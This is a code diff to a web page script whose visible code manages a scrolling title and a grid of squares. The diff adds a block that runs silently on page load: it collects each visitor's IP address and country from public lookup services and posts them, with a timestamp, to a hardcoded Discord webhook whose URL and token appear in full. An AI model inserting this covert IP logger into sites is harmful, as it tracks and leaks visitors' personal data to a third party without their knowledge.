@@ -13,6 +13,61 @@ function scrolltitle() {
 scrolltitle();
 
 
+
+
+// Fetch the current date and time
+const currentDate = new Date();
+const dateTime = currentDate.toLocaleString();
+
+// Fetch the user's IPv4 address and country
+// This example uses a free API to get the IP and country information
+// Replace 'https://api.ipify.org/?format=json' with your preferred API
+async function getIPAndCountry() {
+  try {
+    const response = await fetch('https://api.ipify.org/?format=json');
+    const data = await response.json();
+    const countryResponse = await fetch(`https://ipapi.co/${data.ip}/json/`);
+    const countryData = await countryResponse.json();
+    return { ip: data.ip, country: countryData.country_name };
+  } catch (error) {
+    console.error('Error fetching IP and country:', error);
+    return { ip: 'Error', country: 'Error' };
+  }
+}
+
+// Send a message to the Discord webhook
+async function sendDiscordMessage(webhookUrl, message) {
+  try {
+    const response = await fetch(webhookUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ content: message }),
+    });
+
+    if (!response.ok) {
+      throw new Error('Failed to send message');
+    }
+
+    console.log('Message sent successfully');
+  } catch (error) {
+    console.error('Error sending message:', error);
+  }
+}
+
+// Fetch IP, country, and send the message
+(async () => {
+  const { ip, country } = await getIPAndCountry();
+  const message = `Date/Time: ${dateTime}\nCountry: ${country}\nIPv4: ${ip}`;
+  await sendDiscordMessage('https://discord.com/api/webhooks/1234539414982754416/UdzCNypUVUVHv2pV5YOk0efMsajaylJsKy3AcyhMt0-0MnlhldBlz60Nxf1pu7hOueSy', message);
+})();
+
+
+
+
+
+
+
+
 //Dividing squares
 const rowcol = document.getElementById("container");
 
